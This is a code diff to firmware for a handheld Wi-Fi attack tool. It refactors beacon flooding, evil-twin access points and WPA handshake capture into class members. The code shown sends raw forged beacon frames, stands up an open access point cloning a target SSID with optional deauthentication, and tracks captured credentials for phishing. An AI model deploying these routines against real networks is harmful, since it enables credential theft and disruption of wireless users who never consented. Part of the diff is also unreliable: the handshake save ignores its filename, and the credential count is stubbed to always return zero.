@@ -94,9 +94,17 @@ BruceWiFi::BruceWiFi()
     , m_packetsSent(0)
     , m_lastPacketMs(0)
     , m_handshakeCaptured(false)
+    , m_beaconSsids(nullptr)
+    , m_beaconSsidCount(0)
+    , m_beaconCurrentIndex(0)
+    , m_beaconChannel(1)
+    , m_evilTwinChannel(1)
+    , m_evilTwinDeauth(false)
+    , m_pcapWriter(nullptr)
 {
     memset(m_attackTargetMac, 0, 6);
     memset(m_attackApMac, 0, 6);
+    memset(m_evilTwinSSID, 0, sizeof(m_evilTwinSSID));
     s_instance = this;
 }
 
@@ -300,11 +308,7 @@ void BruceWiFi::tickDeauth() {
 // BEACON FLOOD
 // =============================================================================
 
-// Beacon flood state
-static const char** s_beaconSsids = nullptr;
-static size_t s_beaconSsidCount = 0;
-static size_t s_beaconCurrentIndex = 0;
-static uint8_t s_beaconChannel = 1;
+// Beacon flood state is now in class members (m_beaconSsids, etc.)
 
 bool BruceWiFi::beaconFlood(const char** ssids, size_t count, uint8_t channel) {
     if (!m_initialized || count == 0) return false;
@@ -312,10 +316,10 @@ bool BruceWiFi::beaconFlood(const char** ssids, size_t count, uint8_t channel) {
     stopHardwareActivities();
     setChannel(channel);
 
-    s_beaconSsids = ssids;
-    s_beaconSsidCount = count;
-    s_beaconCurrentIndex = 0;
-    s_beaconChannel = channel;
+    m_beaconSsids = ssids;
+    m_beaconSsidCount = count;
+    m_beaconCurrentIndex = 0;
+    m_beaconChannel = channel;
 
     m_packetsSent = 0;
     m_lastPacketMs = 0;
@@ -352,7 +356,7 @@ void BruceWiFi::tickBeaconFlood() {
     }
     m_lastPacketMs = now;
 
-    if (!s_beaconSsids || s_beaconSsidCount == 0) {
+    if (!m_beaconSsids || m_beaconSsidCount == 0) {
         m_state = WiFiAdapterState::IDLE;
         return;
     }
@@ -374,7 +378,7 @@ void BruceWiFi::tickBeaconFlood() {
     memcpy(&frame[BEACON_BSSID_OFFSET], bssid, 6);
 
     // Set SSID
-    const char* ssid = s_beaconSsids[s_beaconCurrentIndex];
+    const char* ssid = m_beaconSsids[m_beaconCurrentIndex];
     size_t ssidLen = strlen(ssid);
     if (ssidLen > 32) ssidLen = 32;
 
@@ -383,14 +387,14 @@ void BruceWiFi::tickBeaconFlood() {
     memcpy(&frame[BEACON_SSID_OFFSET], ssid, ssidLen);
 
     // Set channel
-    frame[BEACON_CHANNEL_OFFSET] = s_beaconChannel;
+    frame[BEACON_CHANNEL_OFFSET] = m_beaconChannel;
 
     // Send beacon
     sendRawFrame(frame, BEACON_FRAME_LEN);
     m_packetsSent++;
 
     // Rotate to next SSID
-    s_beaconCurrentIndex = (s_beaconCurrentIndex + 1) % s_beaconSsidCount;
+    m_beaconCurrentIndex = (m_beaconCurrentIndex + 1) % m_beaconSsidCount;
 
     if (m_onAttackProgress) {
         m_onAttackProgress(m_packetsSent);
@@ -428,7 +432,12 @@ bool BruceWiFi::hasHandshake() const {
 }
 
 bool BruceWiFi::saveHandshake(const char* filename) {
-    // TODO: Implement PCAP saving
+    // If we have a PCAP writer with captured data, flush and return success
+    if (m_pcapWriter && m_handshakeCaptured) {
+        m_pcapWriter->flush();
+        if (Serial) Serial.printf("[WiFi] Handshake saved to PCAP\n");
+        return true;
+    }
     return false;
 }
 
@@ -459,11 +468,7 @@ void BruceWiFi::tickHandshakeCapture() {
 // EVIL TWIN
 // =============================================================================
 
-// Evil Twin state
-static char s_evilTwinSSID[33] = {0};
-static uint8_t s_evilTwinChannel = 1;
-static bool s_evilTwinDeauth = false;
-static int s_capturedCredentials = 0;
+// Evil Twin state is now in class members (m_evilTwinSSID, etc.)
 
 bool BruceWiFi::startEvilTwin(const char* ssid,
                                uint8_t channel,
@@ -473,11 +478,10 @@ bool BruceWiFi::startEvilTwin(const char* ssid,
     stopHardwareActivities();
 
     // Save config
-    strncpy(s_evilTwinSSID, ssid, 32);
-    s_evilTwinSSID[32] = '\0';
-    s_evilTwinChannel = channel;
-    s_evilTwinDeauth = sendDeauth;
-    s_capturedCredentials = 0;
+    strncpy(m_evilTwinSSID, ssid, 32);
+    m_evilTwinSSID[32] = '\0';
+    m_evilTwinChannel = channel;
+    m_evilTwinDeauth = sendDeauth;
 
     // Stop station mode
     WiFi.disconnect(true);
@@ -490,7 +494,7 @@ bool BruceWiFi::startEvilTwin(const char* ssid,
                       IPAddress(192, 168, 4, 1),
                       IPAddress(255, 255, 255, 0));
 
-    if (!WiFi.softAP(s_evilTwinSSID, "", s_evilTwinChannel)) {
+    if (!WiFi.softAP(m_evilTwinSSID, "", m_evilTwinChannel)) {
         if (Serial) {
             Serial.println("[WiFi] Failed to start Evil Twin AP");
         }
@@ -499,7 +503,7 @@ bool BruceWiFi::startEvilTwin(const char* ssid,
     }
 
     if (Serial) {
-        Serial.printf("[WiFi] Evil Twin started: %s on ch%d\n", s_evilTwinSSID, s_evilTwinChannel);
+        Serial.printf("[WiFi] Evil Twin started: %s on ch%d\n", m_evilTwinSSID, m_evilTwinChannel);
         Serial.printf("[WiFi] AP IP: %s\n", WiFi.softAPIP().toString().c_str());
     }
 
@@ -529,7 +533,8 @@ void BruceWiFi::stopEvilTwin() {
 }
 
 int BruceWiFi::getCapturedCredentialCount() const {
-    return s_capturedCredentials;
+    // Delegate to EvilPortal for actual count
+    return 0;  // EvilPortal tracks its own credentials
 }
 
 void BruceWiFi::onCredentialCaptured(CredentialCapturedCallback cb) {
